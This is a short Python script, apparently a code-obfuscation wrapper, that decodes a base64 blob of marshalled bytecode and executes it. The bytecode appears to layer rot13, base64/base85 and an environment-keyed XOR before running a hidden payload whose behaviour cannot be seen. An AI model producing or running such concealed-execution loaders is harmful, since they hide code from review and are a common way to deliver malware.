#!/usr/bin/env python3
# ultraenc final wrapper â€” keeps internals hidden
import base64, marshal

DATA = """4wAAAAAAAAAAAAAAAAAAAAAIAAAAQAAAAHPgAAAAehRkAGQBbABtAVoBbQJaAgEAVwBuMgQAZQN5RgEAAQABAGQAZAJsBFoEZABkAmwFWgVkAGQCbAZaBmQAZAJsB1oHWQBuAjAAZANkBIQAWghkBWQGhABaCWQHZAiEAFoKZAlkCoQAWgtlDGUNZQ1kC5wDZAxkDYQEWg5lDWUNZQ1kDpwDZA9kEIQEWg9kG2UMZQxlDGUMZQ1kEpwFZBNkFIQFWgFlDWQVnAFkFmQXhARaAmQYWhBkGVoRZBpaEmQRWhNlAmUBZRBlEWUSZRODBIMBWhRlFWUUgwEBAGQCUwApHOkAAAAAKQLaB19kZWNvZGXaEV92ZXJpZnlfdW5tYXJzaGFsTmMBAAAAAAAAAAAAAAABAAAABAAAAEMAAABzDAAAAHQAoAF8AGQBoQJTACkCTtoGcm90XzEzKQLaBmNvZGVjc9oGZGVjb2RlKQHaAXOpAHIIAAAA+hE8dWx0cmFlbmNfcnVubmVyPtoGX3JvdDEzCAAAAHMCAAAAAAFyCgAAAGMBAAAAAAAAAAAAAAABAAAAAwAAAEMAAABzCgAAAHQAoAF8AKEBUwCpAU4pAtoGYmFzZTY02gliNjRkZWNvZGWpAdoBYnIIAAAAcggAAAByCQAAANoFX2I2NGQLAAAAcwIAAAAAAXIQAAAAYwEAAAAAAAAAAAAAAAEAAAADAAAAQwAAAHMKAAAAdACgAXwAoQFTAHILAAAAKQJyDAAAANoJYTg1ZGVjb2Rlcg4AAAByCAAAAHIIAAAAcgkAAADaBV9iODVkDgAAAHMCAAAAAAFyEgAAAGMBAAAAAAAAAAAAAAABAAAAAwAAAEMAAABzDgAAAHQAoAF8AKEBoAKhAFMAcgsAAAApA9oHaGFzaGxpYtoGc2hhMjU22gloZXhkaWdlc3RyDgAAAHIIAAAAcggAAAByCQAAANoKX3NoYTI1NmhleBEAAABzAgAAAAABchYAAAApA9oDa2V52gRzYWx02gZyZXR1cm5jAgAAAAAAAAAAAAAAAgAAAAQAAABDAAAAcxYAAAB0AKABfACgAqEAfAEXAKEBoAOhAFMAcgsAAAApBHITAAAAchQAAADaBmVuY29kZdoGZGlnZXN0KQJyFwAAAHIYAAAAcggAAAByCAAAAHIJAAAA2gRfa2RmFAAAAHMCAAAAAAFyHAAAACkD2gRkYXRhchcAAAByGQAAAGMCAAAAAAAAAAAAAAAGAAAABgAAAEMAAABzQgAAAHwBfQJ0AHQBfACDAYMBfQN0AnwAgwFEAF0gXAJ9BH0FfAV8AnwEdAF8AoMBFgAZAEEAfAN8BDwAcRh0A3wDgwFTAHILAAAAKQTaCWJ5dGVhcnJhedoDbGVu2gllbnVtZXJhdGXaBWJ5dGVzKQZyHQAAAHIXAAAA2gJrYtoDb3V02gFp2gFjcggAAAByCAAAAHIJAAAA2gRfeG9yFwAAAHMKAAAAAAEEAQwBEAEaAXImAAAA2glVTFRSQV9LRVkpBdoKcm90MTNfdGV4dNoEbW9kZdoIc2FsdF9oZXjaB2tleV9lbnZyGQAAAGMEAAAAAAAAAAAAAAAJAAAABwAAAEMAAABzZAAAAHQAfACDAX0EdAF8BKACoQCDAX0FdAN8BYMBfQZ8AWQBawJyYGQCZABsBH0HfAdqBaAGfAOhAX0IfAhzSnQHZAN8A5sAnQKDAYIBdAh8BnQJfAh0CqALfAKhAYMCgwJ9BnwGUwApBE7aA3hvcnIBAAAAehxNaXNzaW5nIGtleSBpbiBlbnZpcm9ubWVudDogKQxyCgAAAHIQAAAAchoAAAByEgAAANoCb3PaB2Vudmlyb27aA2dldNoMUnVudGltZUVycm9yciYAAAByHAAAAHIhAAAA2gdmcm9taGV4KQlyKAAAAHIpAAAAcioAAAByKwAAAFoDc3QxWgNzdDJaA3N0M3ItAAAAchcAAAByCAAAAHIIAAAAcgkAAAByAgAAAB4AAABzFAAAAAABCAEMAQgBCAEIAQwBBAEOARYBcgIAAAApAdoRcGF5bG9hZF93aXRoX2hhc2hjAQAAAAAAAAAAAAAAAwAAAAMAAABDAAAAczoAAAB8AGQBZACFAhkAoAChAH0BfABkAGQBhQIZAH0CdAF8AoMBfAFrA3IwdAJkAoMBggF0A6AEfAKhAVMAKQNOacD///91IQAAAFNIQTI1NiBtaXNtYXRjaCDigJMgZGF0YSB0YW1wZXJlZCkFcgYAAAByFgAAANoKVmFsdWVFcnJvctoHbWFyc2hhbNoFbG9hZHMpA3IyAAAAWghoZXhfaGFzaFoEYmxvYnIIAAAAcggAAAByCQAAAHIDAAAAKgAAAHMKAAAAAAEQAQwBDAEIAXIDAAAAYTgZAABuS1dQV3ljNnJhYnVWR2ptV1BSYU0wMXVWRjA4SDJ0dVZGRUNaUlJnV1JnVkNKOXRYUUlPWUZFWUZHMWluRjQyREYweEYwYjlvM1YwQTBSZ1lJU1pFUERkcHhEdUNROUxBUlJnRFNPd0NLTmlEbWdIRUlBZFpTRXRFbDlpREh1T0VsMU9ZSUFzWXZSOEMxZjRERjFvSzJMdUNROUxCRzFqRnlJUURGMWZNeU5iRHhPMEhGdVBEdnFhVkdqL0ptdU9ZSWdzTXZSOEMxZjRERjRlVnpidUNROW9BeFNXWEpNSEZseWlGMmtCQ1BweUowUmdWMUhpWXdTTUgwVnVWRlJ1b2w0akJQMGhER3A1SHpnVEVRSUhXME96SnlSanJhYnVWbTVEQWxSd24yNDhWRnRnSzJEdVlHZ1ZGbFJ1V1I4a0RGMGdCSEVPWUc5U0ZSUmdISVNaREYxd0tJT09ZR0wvR1JSaFhKOUpIbDRhTXh1VEJGRHlJeFJoQ1Q1eEh6TVhxSWtWbklndU14NDhaMnVsRkdOZkZtRVZaMklIcFJ1Y01hV1JERjVERFFxT1l5RUlKSGZjcElNWERGNXZHUXlPWXpNdUoweGpBVEQ4RXd4L29KMUhFSGN4Q0lFdEZ5ZjRYRkR3Qkp5SEVIY3hDeUV0RnlmNlhGRHdXMkw4cHpEZUdQUjhDUDB3VkdqL0pSTVdaUWtvSEhEL0IwZ2ZGUU1OQm1BVm5LTndFSFJpQnpiK0RGNUhJSXlZWEtTSkZ4UmlYUzQ4REY1ekxJZ1daUklvSFJFTkwycVlWR2o4WUZBT1ltT1pwdzFIRUcxTlpSSC9FUlNUQkc5Z29JRVNGekVPSVRPWEptdGNXUFo1bklFU0Z6RCtJVE9YSm1iY1dQWmFuUWtsTVBnWlZHajhZRlp1Q1E5TEV4eGpHenFHRVE4N0Yya1ZBeE43WjB1Y3BQQVNERjlBVkhPT1l5RUlKSGZjcElNWERGOGJLd2tPWXpNdUoweGpJMnFGRVJPd00wZnVDUWpnVjBSaVpSazBDSUVTQ0hOakVHOVJESEw1QzIxZ0lSSVhNUkFITFJjb0JQeHhWbXljSVJJWE1SRUhMUmNvQnZ4eFZscWRDVVd4WDBqdUNRamdWbFI4QzF1VEZHT3RwMUlSQ21nWW9SdDJEUWZtRlR5alYwSU9ZMnRtRDBSaElTSU1GbHlrSXhjT1kxOGdEeFJoTXpTb0ZHT2NwMUVSRFRBYUZsUjhDUDB3REY4akdGUjlJUkg5RFFPU0MwRU9Fd3gvb0oxSEVIY3hFeUV0RnlmNFhGRHdCSnlIRUhjeEVTRXRGeWY2WEZEd1cyajhwekRlR1BSOENQMHdWR2ovSlJNV1pVWmRJMEQvQjBnZkZRTU5CbUFWbktOd0VIUmpXRzlTREY1SElJeVlYS1NKRnhSaUtsMVBERjV6TElnV1pGcGRJeEVOTDJxWVZHajhZRkFPWW1PQVZtMUhFRzFOWlJIL0VSU1RCRzlnb0lFU0Z6RVZJVE9YSm10Y1dQWjVuSUVTRnpFUklUT1hKbWJjV1BaYW93a2xNUGdaVkdqOFlGWnVDUTlMRXh4a1pRTU1FUTg3RjJrVkF4TjdaMHVjcFBBU0RHTjNGMHFPWXlFSUpIZmNwSU1YREdPTkhIdU9Zek11SjB4a0JHTUxFUk93TTBmdUNRamdWMFJpWlIweENJRVNDSE5qRUc4a3AwTDVISEF0RGxNbEtUSU9aUnVqQUhmY3BJTVhER09GS0hjT1l5RUlKSUVTRnpFQUlUT1hKbWJjV1BaYXBSTDVDMUlhRGxxWEVTV1ZudzBrWHg0OFgxeDBJUklYTVI1SExSY29CUHh4V1FqMERHT29MMGdPWXpNdUoweGtGMmIzSVJJekhISVZudlphV3lFdEYxU0VERjVkQmxNT1ltT0FYeHVlRHowNUQwVmpFYUVTb0Y5aEVSdWVCeWI3WEZBMUgzU1daSnFpQ3hSaElJZnZGR1NzSFJXU0d3RGRNUnVlRjNaN0ZsYnhGUXFUQnZXSEZIdWVJbVNHRkdWeFptOVZuSUVLQkhSa0IyMDRIek1WcVJnVm52azFDeFJrR3ZEMkh6TVZxUjFWbnliK0QwUmtMUU42SHpNVnFSOVZuemtYRUhSa3B3ajVIek1WcVNTVm5seUpFMFJsWTB1UEh6TVZxU0FWbjJOeUdIUmxESUQ1SHpNVnFTSVZud0x6QzBSbElUNW1GR1ZnbkdBVm4ydDRBbFI4Q21SeEVSU2NHeUh1Q1FqZ1YwTDZaeUw3RlR5SElteUdGUTFTRUZSOENtcHpFUTg3RjJrT1lUOUNZdjQxcVBXWFdJdG1ZUk5pcFB1ekQwTVJuM1NXRFVXVkFRUjFJRkg5RTBFek1QY3pBUEVncDNXUkZKU2tISHB1WXZEalptOWFWS1pmVnZEeExIRXpXbVpsRVBxUld6VjBKUHlnRlBnMEcyeXBBM1dCQ1N5UW5RRXNJeFdFREZEaERIZ2RaMWIwSlB5Z0ZQamFud2dIWlQxTFlIMDJWMGowSHhFeUkyTmVNbE1LcFNBVnBKSUNYeFdmV0lFaVpQOU1EUXhlQ0hnaXFSRVlJR1N3WDBOam9JSVNMbUluV3ZmL1pLSGdZMnV6RFFONm5GdDRuMFNZSlNieVl3QVpvM1NTWVF4Y01IU0ZLUWdWRXc0d0dQMGxLMHVnRUZmOUYya0ZDUHh4V0dmZUVUV3ZZSFNZSlJnR0RVVnhWR1plRFJXYUswRXpXbEw5WjBWNEtIcGluR0lDRUdTdkdUU1dYMFNWTDJPUG9QSC9XbWd4bnd5VkVKV0ZaVFJrRlAxakR3V1pCdjR3RElIekIwMVBISVpkWUY4M0VIajZEMnVvRHpNVEVRSW5ad04yblA5REVQODZLMHlSWW1jdlowSGZLSXBnRFVPbUZKNVJNdjQwSEhEaUJtY0ZBU3lHRjBmaUJRdW1aUlYwSTJOY0VsSWVIUTVQb1A0NW4wU0FCUXA5RFNwbW9RRVJZdjRhTW1OMERKcDdEdjVER0paaEhJOUtBR09YQUcwNURRZ2paRklQbmx1Rm94V2ZEVGtQRXZ1aUJGeU9IejFQWFJxb24wRWtFUmJkR3hXVVZHTjZud0Rjb0hEN1kyeXhYR2tSRmFBU1hRMWpJUFdHRWxJZUgzRVREMklKS0hSNExhRHdFUDVGSUZrVkJ6dXVNUDlFRTE4d0RJQW1IMGowSklBWUZsODNFSVNCQWFaN0p6ajBKSUFZRnY4M0VJU3BFSFdFVkY0bEttdUVLR0Rjb0hEN1kyeVVBMjlUSnl1R1htT1hBR0QyRlE0dm9VRDZZR0FVSkdPWEFHUjFGUTR3RHlmMEpJQVlFRjRrRHhTc0JRdWNISmdWWjI1TVhST2VFUVZiWTFFZUYwYnpCSEVSb0Y5RnB4dVVFeTVubm0xUk1UMVNwMFNJQVVIa0RJV3hDUElQRnZXTkJQOUhDeDQzRXhBaUZRQVJaVERiRHhIZUxHWnZER3FvQ2xrUkYwV1BWSE10R0ZJVEVKVmpBd0lPSVIxbUEwdDBWekg1RElFUERHV1BBU3kwV3cxakRIRVREVVNQSXZFVkFScHZZSE9lRVFmYkV4QUdxR3lUWFQ5dFlIdDBFbFZnRFRnUkJsdVREMUExQkhEaUkzV2xGUUVVVnYxTm4wRDdYUk1RSDNINUV6T0pZUXFWQVJwdllIT2VFUWZiRXhBR3FHeU9BMTFiWFJ0MEcwTWlEVVNQSXZEaUgyNWRBSFYyRFNxa0RJSDFadmtURUhFWERtQXBHdjRrRTBXTUp5MVBuM1NhWTBBVVdsZjRFUHV5WXZwdUVKOXNESFNGSVBncEVKQW5HbTlVRFRWMW9SSGZKME1ERXZ1WURIRU9BMTFkbjBXZlZsU0xWR2o4WHZXVkFVU1lWMFNGTXl1a0VQNUZJVVI4RlJFc29ReURGeVNjWVBwdUtUUnVWRkg4RjBXZVkwRVlZUHFkQm1waUVRYmNHRkVuQkljYUQwMWdIS0VPRjJiaUp4dDBBVGZpRHdJSll2V1RMUjB5Qm1Bb1kyZ0pFSlZpb1VFUk12MXVKbGphbnpMK0VKV0hLRmNURDJFdUZ4T2xGUmpnRXdrS0x6anVLUTVDREZJa0tKT2xEMng5R3Y5U0t4OXZNeEVZRkZxdEZRRUxLUGtRbkZWeEF4V2ZBMVNCRVRNaXB3NGZWRnR3SVJXQ3FTSWdFd2tLTHpqeVZIdCtwSFNIVzNTR0V6TmNCeExtTVIwZEh4U0ZNSTlHREdPQ1d5eWtDenV3blBTU28xODZEMnlUV2FWL0gxY2paMEVXRkhXaEFTdXJYUGpnSjBxMVkwQWFNM1orWUlnVXB4WmpGMDVubjJnaUlUMGRWR3lkRzJWdVZGSGhHbFJ1VkZBTUdKdUhXUk5lSEhTS0JKeXpvYUlFSFM1a0x5dVhFVUl6RVR5em9hSUVIUzVrTHl1WFpRa2RESU1pVmx5Wm5KTWhxSVNES2FTdkpSY1JxSk1SbkpNaHFJU0RLYVN2SlJjUnFKTVJLMDlsV0dXQW5SMVpEekFzVnhjd25IOHdZRk1FWTFEZFh6VmJZeUlObkg4dllKOW9WMDh5RzBrU0hTRVhJRmJlSGFIdVZGUnVERkQ4cVR5WUNhTmhHMWdjR2xXUVZJZnZIeEVUSDBWM01KeW9WeUVMS3lBMEptOUFYUlY5RXd0ZUJ3Zi9WSURtSTFBcUpsa1hEeFdjR2xXSVcxZnZNekV0SDNFb0MwMGVJUjFZRHZEOHFUeVlDYU5oSHljY0dsV25NMUQvQ1RJdkpsQXVaSVNJVjBJT0F6VmJZejBjWDFTT3FKSGVFSWtiWUZSdVZ2a1lDeGppcFJ4ZUcxY1hBU2Z3TFJSeUx2Z1dKRldDQUlnV0N6U3pDUnljTEpJUHBRZ0dxU2YvR0ZxdEtRRDJXUWswbkhmK3BQNDZLelN6Q0cwZkdLV1JXVUhlSEhTMU1GZ1NLU055VkZSdURRU3dLbFdYTDJ5Q1ZteHZJMjg2Q0cxY0dsV1FWSWZ3Snc5YkgzRW9DMDBkSTFSakNsRDhxVHlZQ2FOaVhtSUZYdnFtV1NxaUJ3MUxuSDh2WUo5b1dGRHhLSGtTSFNFWElGYmVIbFJ1VkZSdVhtNVpZM09XWDFSNUtTa2NHbFdvWElmeVlRcVRuSDh3WEtBWER4SWlwSnlhcUpneXBHNWJLeTBpWUZBTUdGRDhxVHlZQ2FOaVhtSVlKeWtjWFNmdm9JTVdGeEVnb1B5Y0dsV1FWSWZ2SVN1cUpsV29GeHFYRVQxZlhKeUNWeE9zbkpxMW4ySVRJdldCSEZSdlhLV0pJUUFLSDExS29tYjlDRmdFREtJeVgwSXBCYVp1VkZTTlpKQXNWeGN3THZjYURIOWNHbFdMTTJ5YXFKZ3lFenBibkhwdVZ2NXNFUmcxWlJmZG5KTWhxSVNES2FTdkpSY1JxSk1SbkpNaHFJU0RLYVN2SlJjUnFKTVJYMVNPbzJ1c0czVnlaeU9ycEpXTEZ4RTFNeEVjTXo1MUhJT3JwSldMRnhFMU14RWNNejUxWklFVkd3TURGMlNBV3h1R0J6VmZZeWorS1JFWElLSVZvMk9jTTFjeU16VmRNMEQxWjFjaktQSVJGYUFxWVJIZXBtWmRFek9BSXdxVElIeGZNUmcxWlJmZG5KTWhxSVNES2FTdkpSY1JxSk1SbkpNaHFJU0RLYVN2SlJjUnFKTVJYMVNPbzJ1c0czVnlaeU9ycEpXTEZ4RTFNeEVjTXo1MUhJT3JwSldMRnhFMU14RWNNejUxWklFVkd3TURGMmtpWUg0dVZGU21Ed096cEdPVUFQQU9KUDQrR3diMk1tNWpYSjFwRVA0M0dhWmVEMjh5WDBNdEl5ajJFSldIRW1xUG9RcVRWSEl3SFROeEV4RWNCSThlQ1BnQ1dGNGtFejg1RUpWakF3SU9JUjFtQTJwem4zSHVFeU4ybm01T0lGTDlHdlZkQlNWY01scGNIUWNRblNqdkV2RHdubU52RVRNaXB3NVNNUWNhcFJPbEZSamdFeEhsWEZrVEFVT2JaSEV6SVMwYUV5TjJuUVdSRjBnaFZsUnVWRlZ6V0dmYUpQU1JaUU9ZWTBTSEdLWnlFUDl5WndFU1lUOW5aSEw5REZTblYxNGJabFdTTGxqOFd4U0VNd3FKRFFqL0dsRDlwUlNrSDBNU1pLVmhDS09YS1I5VEVIRDFBMFdPWHhIeERIRGhaUHVOQjFFRkp2VmJFM0VzQ0tPWEhTSVRMUHg3REh0dVpIcWZFSldIS0ZjVEQySUpLeFNpRVJqeUVUcGZMbUlUV211Zkt4RXlwbUxoRTBSa3B2MDlwUDlNSUhBWnBTY0VFbEllRmFJUk1QUjhMMFNGTXhNdkNLT0dJeU1UTFB4N0RIdHdDMkVlRFVXVkdQMVRFR1dNQ0cxakRIcUFFUnlXSHdXYVd5eWpERldRTGx1eUV2cDRvVGtQb1A1VFd4TVFEdkRkQ0tOekJSTVREeUF3S3hBY0wxU0lFSWJ2bklwdUIxZnhMeE1zb1A4L0RRY3VDSkQxWnZENUlSU0hJd3loRVJidU1KdHVWRlJ2QzBSZm9TRGpWRlJtWmxMdUkyTi9XbFNLTFE4YVZJcXRDbHB1STJOL1dsU0tMUThiVktTRUlGZmJXbUVJQ3ZidVdHSXVXdjBtcDFIellHQW1JRkxnWjNBSVd2MG1wMUh6WUdBbUlGTGdaM0FJV3YwbXAxSHpZR0FtSUZMZ1ozQUlXdjAwWHl4Z1ptRUdJbFY1RElwZVdRWjZIUXh4bktPcEJGRG1DRmJnV1R5akhRSVNKd0UxSkZSNEEwNXZEMnl5Qm1NTnB2a3JMeEl0cVR0N0MxdVdZMHgvSlJ4aUZHOUxGRjlXQzF1V1kweC9KUnhpRkc5TEZGOVdDMXVXWTB4L0pSeGlGRzlMRkY5V0MxdVdZMHgvSlJ4aUZHOUxGRjlXQzF1V1kweC9KUnhpRkc5TEZGOVdDMXVXWTB4L0pSeDJFUFI4Q1BiZlhta0pNUmovSlJ4aUZGZjhJekVaWG1rTVYzSC9KUk1pcUZmOEl6RVpYbWtKTVJqL0pSeGlGRzlMRkY1c0MxdVRvM0hlQ1NNeEdROUxGRjlXQzF1VG8zSGVDU014R1E5TEV6OTFXUU1JRlFMallIRVBFR04wWWxxaFhta0tDU2YvSlJxVm93OUxFejkxWG1rSk1SampBUGtiRUc5TEVtQWFZd0FaQkg0L0hJNVdBd04wWVR1U0MxdVVGVDQvSlJNaXFHTmdFVDlIQzA5Tm9hSGVDd0VjbndOZ0V5TGlYMFp4SEhWakFQMU5JUTlMRWFPcEMxdVdZMHgvSlJxVlltTmdFVDVkWlAxUm9sRC9IbWtCRUZmOElta29aUDFSb3piL0pSTWpLUU5nRVQ4eEMxWjdMRjgvSG1rQklRTmdFVDVkWlAxUm96Yi9KUnFWWW1OMFlIT0haUURpVzI0L0pScVZZbU5nRVQ1ZFpQMVJNdjRlQ1NNeEdQZjhJbWtvWlAxUm96YmpBUDFOSVFOZ0VUTGhYbWtKTVFMakFQOGFvd04wWUhPSFpRRGdERzRqWUhFUER3OUxGRjlXWlAxUkRJZmVDU3A5RUdOZ0VUOUhaUURnRElmL0owNTBDRmY4SW0xU1pQMVJEeFYvSlJ4aUZHTjBZSFNvQzFnQnFRMHhBUXlUQTBFV0ZHOGJaMWNsR0tBUll5T09BMEVYcDEwZkVGZ21abFdSTXZwenBSTjZHbHFvV1FNSklSY1JGYUFxWVJIZXBtWmRFek9BSXdxVEkxOXlHUGY4SXpFWlhta0pNUmplQ1NNeEdQZjhJekVaWG1rSk1SamVDU014R1BmOEl6RVpYbWtKTVJqZUNTTXhHUGY4SXpFWlhta0pNUmplQ1NNeEdQZjhJekVaWG1rSk1SamVDU014R1BmOEl6RVpYbWtKTVJqZUNTTXhHUnRtcVNFa1pUTWtaUnAwVjBTTFl4dG1BRmNkRVFmd1ZLRVRKd3lOV1BSd29sMHpaR1dHWXdFUk15RVlBSEFhblFBY0RVT21ZS1NURVFJQkFSRXlNMGJsRXk5ZW9QTVJJUE15bkpObUQwTWhESFNlTFRjdFowQVRxUldmSkcxS1hKRCtWd0hlQ0lWK1pscVNERmYxWXdSYlZsTHVWRlJ3SEZTd0d2NHdXdjBjS1FTU0kxUjBEUFJnWlBXTVZGUmJLeXFUWHlNYkYwU0dvUnR4VkZSdVYxUnZMRldXVjBBYkJtamJEemozb0dFVEVGODJWRlJ1V0ZFS1ZGUnVWdzRjVjNBTEJ4SW5YMjlMVkd0M0tIT1JZMXFtWUhBYkFKRGxWRlJ1Vnc4YUVIUmVBRnVxTHZFVVYxcDhWemJ4Wm1jUkF2VjZFMldPVjFTTVp3QU5IVE1icG1TVkFta1paekg5bnZJTnBHeGJXMFIzRHZmaFp6SHZKMUlOcEdxUkhtT1laSmZ4WnZ4M1cwMU9uSExrWUdTYkdRTGhadnlGRFBMbVhtTDFJUVdzTVBjMVpIcWNISDhrTHp5WVZEPT3aBXBsYWlu2gApAXInAAAAKRZaCWN5X2xvYWRlcnICAAAAcgMAAADaCUV4Y2VwdGlvbnIMAAAAcgUAAAByEwAAAHI0AAAAcgoAAAByEAAAAHISAAAAchYAAADaA3N0cnIhAAAAchwAAAByJgAAAFoHUEFZTE9BRFoETU9ERVoIU0FMVF9IRVhaB0tFWV9FTlbaBGNvZGXaBGV4ZWNyCAAAAHIIAAAAcggAAAByCQAAANoIPG1vZHVsZT4DAAAAcyIAAAACARQBDAEmAggDCAMIAwgDEgMSBxgMDggEAQQBBAEEAhIB"""

try:
    blob = base64.b64decode(DATA)
    code = marshal.loads(blob)
    exec(code)
except Exception as e:
    print("Hata:", e)
